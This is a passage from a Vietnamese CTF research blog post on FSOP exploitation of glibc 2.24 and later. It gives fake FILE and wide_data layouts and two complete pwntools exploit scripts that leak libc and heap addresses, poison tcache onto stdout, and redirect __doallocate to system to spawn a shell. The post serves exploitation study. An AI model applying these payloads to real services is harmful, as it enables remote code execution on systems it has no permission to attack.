<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_write_base</span><br><span class="line"></span><br><span class="line">_IO_write_ptr</span><br><span class="line"></span><br><span class="line">_IO_write_end</span><br><span class="line"></span><br><span class="line">_IO_buf_base</span><br><span class="line"></span><br><span class="line">_IO_buf_end</span><br></pre></td></tr></table></figure>

<ul>
<li>Ý nghĩa:<ul>
<li>glibc dùng chúng để quyết định <em>đã có buffer chset</em>, <em>buffer đầy chưa?</em>, <em>có cần flush khôwdo</em>, <em>có cần allocate buffdoallocat</em>.</li>
<li>Trick FSOP hay dùng: làm chúng <em>trông như chưa setup</em> ⇒ glibc sẽ gọi <code>_IO_doallocbuf / _IO_wdoallocbuf</code> ⇒ gọi vtable <code>__doallocate</code>.</li>
</ul>
</li>
</ul>
<p><strong>Nhóm C — Wide path (điều kiện để dùng _IO_wfile_jumps + _wide_data)</strong></p>
<ol>
<li><code>_mode</code> (offset 0xC0)</li>
</ol>
<p><code>_mode</code> &#x3D; -1 thường ép stream vào <em>wide-oriented</em>.</p>
<ul>
<li>Nếu <code>_mode</code> không đúng, nó có thể dùng <code>_IO_file_jumps</code> path và set <code>wide_data/wide_vtable</code> sẽ vô nghĩa.</li>
<li>Đây là field “chốt” để wide-chain hoạt động.</li>
</ul>
<ol start="2">
<li><code>_wide_data</code> (offset 0xA0)</li>
</ol>
<ul>
<li>Trỏ tới struct <code>_IO_wide_data</code> (thật hoặc giả).</li>
<li>Nếu fake FILE trên heap: <code>_wide_data</code> phải trỏ tới <code>wide_data</code> giả trên heap.</li>
<li>Đây là field  quan trọng để điều khiển <code>_wide_vtable</code>.</li>
</ul>
<p><strong>Nhóm D — Vtable pointer (bị validate)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Vtable này nằm trong <code>_IO_FILE_plus</code> (<code>FILE</code> + <code>con trỏ vtable</code>). (vtable pointer: offset 0xD8).</p>
</li>
<li><p>Điều quan trọng:</p>
<ul>
<li>vtable phải trỏ vào vùng vtable hợp lệ trong libc (như <code>_IO_file_jumps</code>, <code>_IO_wfile_jumps</code>) để qua <code>_IO_validate_vtable</code>.</li>
<li>Ta không thể trỏ vtable về các địa chỉ khác như trog GLIBC &lt;&#x3D; 2.23 (gây abort).</li>
</ul>
</li>
<li><p>Đây là “mitigation” chính của FSOP hiện đại. </p>
</li>
<li><p>Từ các nhóm trên ta có thể tổng hợp 2 template chung cho 2 dạng bài FSOP glibc &gt;&#x3D; 2.24 sau:</p>
</li>
<li><p>Dạng 1: cho phép đọc ghi vào heap và FSOP thông qua fputs,fwrite,…</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake = heap_addr_of_input          <span class="comment"># phải leak được</span></span><br><span class="line">wide = fake + <span class="number">0xE0</span></span><br><span class="line">lock_addr = libc.sym[<span class="string">&#x27;_IO_stdfile_1_lock&#x27;</span>]</span><br><span class="line">payload = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="string">b&quot;sh\x00&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>),</span><br><span class="line">  <span class="number">0x88</span>: p64(lock_addr),            <span class="comment"># mượn lock trong libc thường là libc.sym[&#x27;_IO_stdfile_1_lock&#x27;]</span></span><br><span class="line">  <span class="number">0xA0</span>: p64(wide),                 <span class="comment"># wide_data -&gt; heap</span></span><br><span class="line">  <span class="number">0xC0</span>: p32(-<span class="number">1</span>, sign=<span class="string">&quot;signed&quot;</span>),    <span class="comment"># _mode = -1</span></span><br><span class="line">  <span class="number">0xD8</span>: p64(libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]),  <span class="comment"># vtable hợp lệ</span></span><br><span class="line">  <span class="number">0xE0</span> + <span class="number">0xE0</span>: p64(wide),          <span class="comment"># wide-&gt;_wide_vtable = wide</span></span><br><span class="line">  <span class="number">0xE0</span> + <span class="number">0x68</span>: p64(libc.sym[<span class="string">&quot;system&quot;</span>]), <span class="comment"># slot doallocate</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><a href="/challenge/HTB/pwn_starshard_core.zip">Link challenge dạng 1</a></p>
<ul>
<li>Solution dạng 1:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./starshard_core_patched&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.34.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        r = remote(<span class="string">&quot;addr&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.GDB:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b*0x000064a099bc9654</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arm</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Enter Starshard Routine Name: &#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Attach</span>(<span class="params">p, size, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Wish-Script Fragment Size: &#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;size&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input Wish-Script Fragment:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cancel</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Commit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = conn()</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Tinkerer Name: &#x27;</span>, <span class="string">b&#x27;%11$p%29$p&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;=== Welcome 0x&#x27;</span>)</span><br><span class="line">    exe_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    exe.address = exe_leak - <span class="number">0x175e</span></span><br><span class="line">    log.info(<span class="string">f&quot;Exe leak: <span class="subst">&#123;<span class="built_in">hex</span>(exe_leak)&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Exe base: <span class="subst">&#123;<span class="built_in">hex</span>(exe.address)&#125;</span>&quot;</span>)</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Libc leak: <span class="subst">&#123;<span class="built_in">hex</span>(libc_leak)&#125;</span>&quot;</span>)</span><br><span class="line">    libc.address = libc_leak - <span class="number">0x2e07d</span></span><br><span class="line">    log.info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># input()</span></span><br><span class="line">    Arm(p)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span>)</span><br><span class="line">    heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">f&quot;Heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line">    Cancel(p)</span><br><span class="line">    w_offset = <span class="number">0xe0</span></span><br><span class="line">    fs = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>, <span class="comment"># b&#x27; sh&#x27;.ljust(8, b&#x27;\x00&#x27;),</span></span><br><span class="line">            <span class="number">0x88</span>: libc.address + <span class="number">0x21b730</span>, <span class="comment"># libc.sym[&#x27;_IO_stdfile_1_lock&#x27;]</span></span><br><span class="line">            <span class="number">0xa0</span>: heap + <span class="number">0xe0</span>,</span><br><span class="line">            <span class="number">0xc0</span>: p32(-<span class="number">1</span>, sign=<span class="string">&quot;signed&quot;</span>),</span><br><span class="line">            <span class="number">0xd8</span>: libc.sym._IO_wfile_jumps,</span><br><span class="line">            w_offset+<span class="number">0xe0</span>: heap + <span class="number">0xe0</span>,</span><br><span class="line">            w_offset+<span class="number">0x68</span>: exe.sym.ginger_gate <span class="comment"># libc.sym.system</span></span><br><span class="line">        &#125;, </span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    Attach(p, <span class="number">0x1e0</span> - <span class="number">0x11</span> ,fs)</span><br><span class="line">    <span class="comment"># GDB(p)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<ul>
<li>Dạng 2: cho phép đọc ghi vào địa chỉ bất kì (thường sẽ ghi vào <code>_IO_2_1_stdout_</code> trong libc) và FSOP qua fputs,fwrite,…</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">w_offset = <span class="number">0xE0</span></span><br><span class="line">fs = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="string">b&#x27; sh&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">        <span class="number">0x88</span>: p64(libc.address + <span class="number">2176896</span>), <span class="comment"># libc.sym[&#x27;_IO_stdfile_1_lock&#x27;]</span></span><br><span class="line">        <span class="number">0xA0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># 0xA0 — đặt _wide_data trỏ vào stdout + 0xE0 (wide data giả) (wide data đóng vai trò giống _IO_wfile_jumps)</span></span><br><span class="line">        <span class="number">0xC0</span>: p32(-<span class="number">1</span>, sign=<span class="string">&quot;signed&quot;</span>), <span class="comment"># 0xC0 — set _mode = -1 để ép đi vào nhánh wide-oriented</span></span><br><span class="line">        <span class="number">0xD8</span>: libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># 0xD8 — đặt vtable của stdout về _IO_wfile_jumps (hợp lệ để qua check, chứ k quan trọng trog việc gọi shell)</span></span><br><span class="line">        w_offset+<span class="number">0xE0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># w_offset + 0xE0 — set _wide_vtable trỏ về chính wide_data (+0xE0 tiếp theo: là offset bên trong struct _IO_wide_data, nơi chứa con trỏ _wide_vtable.)</span></span><br><span class="line">        w_offset+<span class="number">0x68</span>: p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># w_offset + 0x68 — nhét system vào slot __doallocate trog wide data giả (stdout + 0xE0)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><a href="/challenge/lakeCTF/new-mitigations.tar.gz">Link challenge dạng 2</a></p>
<ul>
<li>Solution dạng 2:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;terminator&quot;</span>, <span class="string">&quot;--geometry=960x1000+960+500&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">exe = context.binary = ELF(<span class="string">&quot;./chal&quot;</span>)</span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx?: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size?: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;data?: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx?: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx?: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx?: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;data?: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;chall.polygl0ts.ch&quot;, 6242)</span></span><br><span class="line">io = process(exe.path)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>():</span><br><span class="line">    gdb.attach(io, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b*0x000055555555562e</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">malloc(<span class="number">0</span>, <span class="number">0x420</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="number">0x1f0</span>, <span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;meow: &#x27;</span>)</span><br><span class="line">libc.address = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x211b20</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;meow: &#x27;</span>)</span><br><span class="line">heap = u64(io.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64((heap&gt;&gt;<span class="number">12</span>) ^ (libc.sym._IO_2_1_stdout_)))</span><br><span class="line">malloc(<span class="number">0</span>, <span class="number">0x1f0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">w_offset = <span class="number">0xE0</span></span><br><span class="line">fs = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="string">b&#x27; sh&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">        <span class="number">0x88</span>: p64(libc.address + <span class="number">2176896</span>), <span class="comment"># libc.sym[&#x27;_IO_stdfile_1_lock&#x27;]</span></span><br><span class="line">        <span class="number">0xA0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># 0xA0 — đặt _wide_data trỏ vào stdout + 0xE0 (wide data giả) (wide data đóng vai trò giống _IO_wfile_jumps)</span></span><br><span class="line">        <span class="number">0xC0</span>: p32(-<span class="number">1</span>, sign=<span class="string">&quot;signed&quot;</span>), <span class="comment"># 0xC0 — set _mode = -1 để ép đi vào nhánh wide-oriented --&gt; (để bằng 0 vẫn được)</span></span><br><span class="line">        <span class="number">0xD8</span>: libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># 0xD8 — đặt vtable của stdout về _IO_wfile_jumps (hợp lệ để qua check, chứ k quan trọng trog việc gọi shell) (Ko nhất thiết dùng offset: - 0x38 + 0x18 chỉ cần vùng _IO_wfile_jumps (là vùng chứa các entry như __xsputn,...))</span></span><br><span class="line">        w_offset+<span class="number">0xE0</span>: p64(libc.sym._IO_2_1_stdout_ + <span class="number">0xE0</span>), <span class="comment"># w_offset + 0xE0 — set _wide_vtable trỏ về chính wide_data (+0xE0 tiếp theo: là offset bên trong struct _IO_wide_data, nơi chứa con trỏ _wide_vtable.)</span></span><br><span class="line">        w_offset+<span class="number">0x68</span>: p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># w_offset + 0x68 — nhét system vào slot __doallocate trog wide data giả (stdout + 0xE0)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># GDB()</span></span><br><span class="line">malloc(<span class="number">0</span>, <span class="number">0x1f0</span>, fs)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2026/01/14/Research/pwn/fsop/">https://elliotbigfan.github.io/2026/01/14/Research/pwn/fsop/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Research/">Research</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/favicon_io/android-chrome-512x512.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025"><img class="cover" src="/img/ctf/seccon/logo.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Writeup: SECCON CTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: unserialize1. Phân tích challenge: File main.c:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;ssize_t unserialize(FILE *fp, char *buf, size_t size) &#123;  char szbuf[0x20];  char *tmpbuf;  for (size_t i = 0; i &lt; sizeof(szbuf); i++) &#123;    szbuf[i] = fgetc(fp);    if (szbuf[i] == &#x27;:&#x27;) &#123;      szbuf[i] = 0;      b...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img class="cover" src="/img/ctf/backdoor/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Writeup: BackdoorCTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến toàn cục contract_seal là địa chỉ libc của hàm system và thực thi các hàm setvbuf. control_manipulation: Encode XOR data người dùng truyền vào buf với nửa phần đầu giá trị của biến contract_seal. war_devils_prophecy:  Encode XOR data người dùng truyền vào buf với nửa phần sau giá trị của biến co...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025"><img class="cover" src="/img/ctf/seccon/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-15</div><div class="info-item-2">Writeup: SECCON CTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: unserialize1. Phân tích challenge: File main.c:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;ssize_t unserialize(FILE *fp, char *buf, size_t size) &#123;  char szbuf[0x20];  char *tmpbuf;  for (size_t i = 0; i &lt; sizeof(szbuf); i++) &#123;    szbuf[i] = fgetc(fp);    if (szbuf[i] == &#x27;:&#x27;) &#123;      szbuf[i] = 0;      b...</div></div></div></a><a class="pagination-related" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 